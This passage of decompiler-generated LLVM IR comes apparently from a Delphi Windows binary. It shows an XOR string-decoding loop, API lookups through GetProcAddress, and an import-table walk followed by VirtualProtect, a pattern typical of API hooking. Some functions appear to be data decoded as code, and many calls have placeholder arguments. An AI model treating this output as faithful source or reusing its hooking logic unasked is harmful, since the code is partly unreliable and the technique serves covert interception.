  %0 = call i32 @__readfsdword(i32 0), !insn.addr !224
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !224
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404639() local_unnamed_addr {
dec_label_pc_404639:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40463e() local_unnamed_addr {
dec_label_pc_40463e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_404640(i32 %arg1) local_unnamed_addr {
dec_label_pc_404640:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404644() local_unnamed_addr {
dec_label_pc_404644:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40464f() local_unnamed_addr {
dec_label_pc_40464f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = load i8, i8* %5, align 4, !insn.addr !239
  %22 = add i8 %21, %15, !insn.addr !239
  %23 = load i32, i32* %eax, align 4, !insn.addr !239
  %24 = inttoptr i32 %23 to i8*, !insn.addr !239
  store i8 %22, i8* %24, align 1, !insn.addr !239
  %25 = load i8, i8* %5, align 4, !insn.addr !240
  %26 = load i32, i32* %eax, align 4
  %27 = trunc i32 %26 to i8, !insn.addr !240
  %28 = add i8 %25, %27, !insn.addr !240
  %29 = inttoptr i32 %26 to i8*, !insn.addr !240
  store i8 %28, i8* %29, align 1, !insn.addr !240
  %30 = load i8, i8* %5, align 4, !insn.addr !241
  %31 = load i32, i32* %eax, align 4
  %32 = trunc i32 %31 to i8, !insn.addr !241
  %33 = add i8 %30, %32, !insn.addr !241
  %34 = inttoptr i32 %31 to i8*, !insn.addr !241
  store i8 %33, i8* %34, align 1, !insn.addr !241
  %35 = load i8, i8* %5, align 4, !insn.addr !242
  %36 = load i32, i32* %eax, align 4
  %37 = trunc i32 %36 to i8, !insn.addr !242
  %38 = add i8 %35, %37, !insn.addr !242
  %39 = inttoptr i32 %36 to i8*, !insn.addr !242
  store i8 %38, i8* %39, align 1, !insn.addr !242
  %40 = add i32 %0, -117, !insn.addr !243
  %41 = inttoptr i32 %40 to i8*, !insn.addr !243
  %42 = load i8, i8* %41, align 1, !insn.addr !243
  %43 = trunc i32 %2 to i8, !insn.addr !243
  %44 = add i8 %42, %43, !insn.addr !243
  store i8 %44, i8* %41, align 1, !insn.addr !243
  %45 = trunc i32 %2 to i16, !insn.addr !244
  %46 = call i8 @__asm_in(i16 %45), !insn.addr !244
  %47 = add i32 %20, -8, !insn.addr !245
  %48 = inttoptr i32 %47 to i32*, !insn.addr !245
  store i32 4212417, i32* %48, align 4, !insn.addr !245
  %49 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %50 = add i32 %20, -12, !insn.addr !246
  %51 = inttoptr i32 %50 to i32*, !insn.addr !246
  store i32 %49, i32* %51, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %50), !insn.addr !247
  %52 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %53 = add i32 %52, 1, !insn.addr !248
  %54 = icmp eq i32 %53, 0, !insn.addr !248
  store i32 %53, i32* @global_var_409678, align 4, !insn.addr !248
  %55 = icmp eq i1 %54, false, !insn.addr !249
  br i1 %55, label %dec_label_pc_4046b3, label %dec_label_pc_404681, !insn.addr !249

dec_label_pc_404681:                              ; preds = %dec_label_pc_40464f
  %56 = call i32 @"@LStrClr"(), !insn.addr !250
  %57 = call i32 @"@LStrClr"(), !insn.addr !251
  %58 = call i32 @"@LStrClr"(), !insn.addr !252
  %59 = call i32 @"@LStrClr"(), !insn.addr !253
  %60 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046b3, !insn.addr !254

dec_label_pc_4046b3:                              ; preds = %dec_label_pc_404681, %dec_label_pc_40464f
  %61 = add i32 %20, -4, !insn.addr !255
  %62 = inttoptr i32 %61 to i32*, !insn.addr !255
  %63 = load i32, i32* %51, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !257
  store i32 4212424, i32* %62, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046c1() local_unnamed_addr {
dec_label_pc_4046c1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046c6() local_unnamed_addr {
dec_label_pc_4046c6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046cc() local_unnamed_addr {
dec_label_pc_4046cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_4046d4() local_unnamed_addr {
dec_label_pc_4046d4:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_403720(), !insn.addr !266
  %1 = call i32 @function_4034c8(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404709, label %dec_label_pc_4046ef, !insn.addr !268

dec_label_pc_4046ef:                              ; preds = %dec_label_pc_4046d4, %dec_label_pc_4046ef
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint (i8** @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_4046ef, label %dec_label_pc_404709, !insn.addr !276

dec_label_pc_404709:                              ; preds = %dec_label_pc_4046ef, %dec_label_pc_4046d4
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_404710() local_unnamed_addr {
dec_label_pc_404710:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404735() local_unnamed_addr {
dec_label_pc_404735:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_40473a() local_unnamed_addr {
dec_label_pc_40473a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_40473c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40473c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_404740() local_unnamed_addr {
dec_label_pc_404740:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404748() local_unnamed_addr {
dec_label_pc_404748:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_40476d() local_unnamed_addr {
dec_label_pc_40476d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_404772() local_unnamed_addr {
dec_label_pc_404772:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_404774(i32 %arg1) local_unnamed_addr {
dec_label_pc_404774:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_404778() local_unnamed_addr {
dec_label_pc_404778:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32* @function_404780(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_404780:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !300
  ret i32* %0, !insn.addr !300
}

define i32 @function_404788() local_unnamed_addr {
dec_label_pc_404788:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !301
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !301
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !301
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !302
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !303
  %3 = add i32 %2, 1, !insn.addr !303
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !303
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !304
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !305
  ret i32 0, !insn.addr !306
}

define i32 @function_4047ad() local_unnamed_addr {
dec_label_pc_4047ad:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !307
  ret i32 %0, !insn.addr !307
}

define i32 @function_4047b2() local_unnamed_addr {
dec_label_pc_4047b2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4047b4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047b8() local_unnamed_addr {
dec_label_pc_4047b8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !310
  %2 = add i32 %1, -1, !insn.addr !310
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !310
  ret i32 %0, !insn.addr !311
}

define i32 @function_404818(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404818:
  %esp.1.reg2mem = alloca i32, !insn.addr !312
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !312
  %eax.0.reg2mem = alloca i32, !insn.addr !312
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !313
  %7 = icmp eq i8 %6, 0, !insn.addr !313
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !314
  br i1 %7, label %dec_label_pc_40482b, label %dec_label_pc_404823, !insn.addr !314

dec_label_pc_404823:                              ; preds = %dec_label_pc_404818
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !315
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !315
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !315
  br label %dec_label_pc_40482b, !insn.addr !315

dec_label_pc_40482b:                              ; preds = %dec_label_pc_404823, %dec_label_pc_404818
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !316
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !317
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !317
  %13 = ptrtoint i32* %12 to i32, !insn.addr !317
  %14 = add i32 %eax.0.reload, 8, !insn.addr !318
  %15 = inttoptr i32 %14 to i32*, !insn.addr !318
  store i32 %13, i32* %15, align 4, !insn.addr !318
  %16 = icmp eq i32* %12, null, !insn.addr !319
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !320
  br i1 %16, label %dec_label_pc_404883, label %dec_label_pc_404847, !insn.addr !320

dec_label_pc_404847:                              ; preds = %dec_label_pc_40482b
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !321
  %18 = add i32 %eax.0.reload, 12, !insn.addr !322
  %19 = inttoptr i32 %18 to i32*, !insn.addr !322
  store i32 %17, i32* %19, align 4, !insn.addr !322
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !323
  %21 = add i32 %eax.0.reload, 16, !insn.addr !324
  %22 = inttoptr i32 %21 to i32*, !insn.addr !324
  store i32 %20, i32* %22, align 4, !insn.addr !324
  %23 = add i32 %eax.0.reload, 20, !insn.addr !325
  %24 = inttoptr i32 %23 to i32*, !insn.addr !325
  store i32 %arg3, i32* %24, align 4, !insn.addr !325
  %25 = load i32, i32* %22, align 4, !insn.addr !326
  %26 = add i32 %esp.0, -8, !insn.addr !327
  %27 = inttoptr i32 %26 to i32*, !insn.addr !327
  store i32 %25, i32* %27, align 4, !insn.addr !327
  %28 = add i32 %esp.0, -12, !insn.addr !328
  %29 = inttoptr i32 %28 to i32*, !insn.addr !328
  store i32 %17, i32* %29, align 4, !insn.addr !328
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !329
  %31 = ptrtoint i32* %30 to i32, !insn.addr !329
  %32 = add i32 %esp.0, -16, !insn.addr !330
  %33 = inttoptr i32 %32 to i32*, !insn.addr !330
  store i32 %31, i32* %33, align 4, !insn.addr !330
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !331
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !331
  %36 = add i32 %eax.0.reload, 24, !insn.addr !332
  %37 = inttoptr i32 %36 to i32*, !insn.addr !332
  store i32 %35, i32* %37, align 4, !insn.addr !332
  %38 = icmp eq i32 ()* %34, null, !insn.addr !333
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !334
  br i1 %38, label %dec_label_pc_404883, label %dec_label_pc_40486f, !insn.addr !334

dec_label_pc_40486f:                              ; preds = %dec_label_pc_404847
  %39 = load i32, i32* %24, align 4, !insn.addr !335
  %40 = add i32 %esp.0, -20, !insn.addr !336
  %41 = inttoptr i32 %40 to i32*, !insn.addr !336
  store i32 %39, i32* %41, align 4, !insn.addr !336
  %42 = load i32, i32* %15, align 4, !insn.addr !337
  %43 = add i32 %esp.0, -24, !insn.addr !338
  %44 = inttoptr i32 %43 to i32*, !insn.addr !338
  store i32 %42, i32* %44, align 4, !insn.addr !338
  %45 = call i32 @function_4048ec(i32 ptrtoint (i32* @0 to i32)), !insn.addr !339
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !339
  br label %dec_label_pc_404883, !insn.addr !339

dec_label_pc_404883:                              ; preds = %dec_label_pc_40486f, %dec_label_pc_404847, %dec_label_pc_40482b
  br i1 %7, label %dec_label_pc_40489a, label %dec_label_pc_40488b, !insn.addr !340

dec_label_pc_40488b:                              ; preds = %dec_label_pc_404883
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !341
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !342
  %48 = load i32, i32* %47, align 4, !insn.addr !342
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !342
  br label %dec_label_pc_40489a, !insn.addr !343

dec_label_pc_40489a:                              ; preds = %dec_label_pc_40488b, %dec_label_pc_404883
  %49 = add i32 %eax.0.reload, 4, !insn.addr !344
  %50 = inttoptr i32 %49 to i32*, !insn.addr !344
  %51 = inttoptr i32 %9 to i32*, !insn.addr !316
  ret i32 %eax.0.reload, !insn.addr !345
}

define i32 @function_4048a4() local_unnamed_addr {
dec_label_pc_4048a4:
  %eax.1.reg2mem = alloca i32, !insn.addr !346
  %eax.0.reg2mem = alloca i32, !insn.addr !346
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !347
  %4 = add i32 %3, 8, !insn.addr !348
  %5 = inttoptr i32 %4 to i32*, !insn.addr !348
  %6 = load i32, i32* %5, align 4, !insn.addr !348
  %7 = icmp eq i32 %6, 0, !insn.addr !348
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !349
  br i1 %7, label %dec_label_pc_4048de, label %dec_label_pc_4048b5, !insn.addr !349

dec_label_pc_4048b5:                              ; preds = %dec_label_pc_4048a4
  %8 = add i32 %3, 24, !insn.addr !350
  %9 = inttoptr i32 %8 to i32*, !insn.addr !350
  %10 = load i32, i32* %9, align 4, !insn.addr !350
  %11 = icmp eq i32 %10, 0, !insn.addr !350
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !351
  br i1 %11, label %dec_label_pc_4048de, label %dec_label_pc_4048bb, !insn.addr !351

dec_label_pc_4048bb:                              ; preds = %dec_label_pc_4048b5
  %12 = add i32 %3, 4, !insn.addr !352
  %13 = inttoptr i32 %12 to i32*, !insn.addr !352
  %14 = load i32, i32* %13, align 4, !insn.addr !352
  %15 = inttoptr i32 %14 to i8*, !insn.addr !353
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !354
  %17 = ptrtoint i32* %16 to i32, !insn.addr !354
  %18 = load i32, i32* %5, align 4, !insn.addr !355
  %19 = icmp eq i32 %18, %17, !insn.addr !355
  %20 = icmp eq i1 %19, false, !insn.addr !356
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !356
  br i1 %20, label %dec_label_pc_4048de, label %dec_label_pc_4048c9, !insn.addr !356

dec_label_pc_4048c9:                              ; preds = %dec_label_pc_4048bb
  %21 = load i32, i32* %9, align 4, !insn.addr !357
  %22 = call i32 @function_4048ec(i32 %21), !insn.addr !358
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !358
  br label %dec_label_pc_4048de, !insn.addr !358

dec_label_pc_4048de:                              ; preds = %dec_label_pc_4048c9, %dec_label_pc_4048bb, %dec_label_pc_4048b5, %dec_label_pc_4048a4
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !359
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !360
  br i1 %24, label %dec_label_pc_4048e9, label %dec_label_pc_4048e2, !insn.addr !360

dec_label_pc_4048e2:                              ; preds = %dec_label_pc_4048de
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !361
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !361
  br label %dec_label_pc_4048e9, !insn.addr !361

dec_label_pc_4048e9:                              ; preds = %dec_label_pc_4048e2, %dec_label_pc_4048de
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !362
}

define i32 @function_4048ec(i32 %arg1) local_unnamed_addr {
dec_label_pc_4048ec:
  %eax.0.reg2mem = alloca i32, !insn.addr !363
  %esp.0.reg2mem = alloca i32, !insn.addr !363
  %storemerge6.reg2mem = alloca i32, !insn.addr !363
  %.reg2mem14 = alloca i32, !insn.addr !363
  %esp.17.reg2mem = alloca i32, !insn.addr !363
  %esi.08.reg2mem = alloca i32, !insn.addr !363
  %.reg2mem = alloca i32, !insn.addr !363
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !364
  %4 = icmp eq i1 %3, false, !insn.addr !365
  %5 = icmp eq i32 %arg1, 0, !insn.addr !366
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_404999, label %dec_label_pc_404912, !insn.addr !365

dec_label_pc_404912:                              ; preds = %dec_label_pc_4048ec
  %6 = trunc i32 %2 to i16, !insn.addr !367
  %7 = trunc i32 %1 to i8, !insn.addr !368
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !369
  %8 = inttoptr i32 %0 to i32*, !insn.addr !370
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !370
  %10 = ptrtoint i32* %9 to i32, !insn.addr !370
  %11 = icmp eq i32* %9, null, !insn.addr !371
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !372
  br i1 %11, label %dec_label_pc_404999, label %dec_label_pc_404992.preheader, !insn.addr !372

dec_label_pc_404992.preheader:                    ; preds = %dec_label_pc_404912
  %12 = add i32 %10, 12, !insn.addr !373
  %13 = inttoptr i32 %12 to i32*, !insn.addr !373
  %14 = load i32, i32* %13, align 4, !insn.addr !373
  %15 = icmp eq i32 %14, 0, !insn.addr !374
  %16 = icmp eq i1 %15, false, !insn.addr !375
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !375
  br i1 %16, label %dec_label_pc_40492b.lr.ph, label %dec_label_pc_404999, !insn.addr !375

dec_label_pc_40492b.lr.ph:                        ; preds = %dec_label_pc_404992.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !369
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !376
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_40492b

dec_label_pc_40492b:                              ; preds = %dec_label_pc_40492b.lr.ph, %dec_label_pc_40498f
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !377
  %24 = add i32 %esp.17.reload, -4, !insn.addr !378
  %25 = inttoptr i32 %24 to i32*, !insn.addr !378
  store i32 %18, i32* %25, align 4, !insn.addr !378
  %26 = add i32 %esp.17.reload, -8, !insn.addr !379
  %27 = inttoptr i32 %26 to i32*, !insn.addr !379
  store i32 %23, i32* %27, align 4, !insn.addr !379
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !380
  %29 = icmp eq i32 %28, 0, !insn.addr !381
  %30 = icmp eq i1 %29, false, !insn.addr !382
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !382
  br i1 %30, label %dec_label_pc_40498f, label %dec_label_pc_40493e, !insn.addr !382

dec_label_pc_40493e:                              ; preds = %dec_label_pc_40492b
  %31 = add i32 %esi.08.reload, 16, !insn.addr !383
  %32 = inttoptr i32 %31 to i32*, !insn.addr !383
  %33 = load i32, i32* %32, align 4, !insn.addr !383
  %34 = add i32 %33, %arg1, !insn.addr !384
  %35 = inttoptr i32 %34 to i32*, !insn.addr !385
  %36 = load i32, i32* %35, align 4, !insn.addr !385
  %37 = icmp eq i32 %36, 0, !insn.addr !386
  %38 = icmp eq i1 %37, false, !insn.addr !387
  store i32 %36, i32* %.reg2mem14, !insn.addr !387
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !387
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !387
  br i1 %38, label %dec_label_pc_404946, label %dec_label_pc_40498f, !insn.addr !387

dec_label_pc_404946:                              ; preds = %dec_label_pc_40493e, %dec_label_pc_404986
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !388
  %40 = icmp eq i1 %39, false, !insn.addr !389
  br i1 %40, label %dec_label_pc_404986, label %dec_label_pc_40494b, !insn.addr !389

dec_label_pc_40494b:                              ; preds = %dec_label_pc_404946
  %41 = add i32 %esp.17.reload, -12, !insn.addr !390
  %42 = inttoptr i32 %41 to i32*, !insn.addr !390
  store i32 %20, i32* %42, align 4, !insn.addr !390
  %43 = add i32 %esp.17.reload, -16, !insn.addr !391
  %44 = inttoptr i32 %43 to i32*, !insn.addr !391
  store i32 128, i32* %44, align 4, !insn.addr !391
  %45 = add i32 %esp.17.reload, -20, !insn.addr !392
  %46 = inttoptr i32 %45 to i32*, !insn.addr !392
  store i32 4, i32* %46, align 4, !insn.addr !392
  %47 = add i32 %esp.17.reload, -24, !insn.addr !393
  %48 = inttoptr i32 %47 to i32*, !insn.addr !393
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !393
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !394
  %50 = add i32 %esp.17.reload, -28, !insn.addr !395
  %51 = inttoptr i32 %50 to i32*, !insn.addr !395
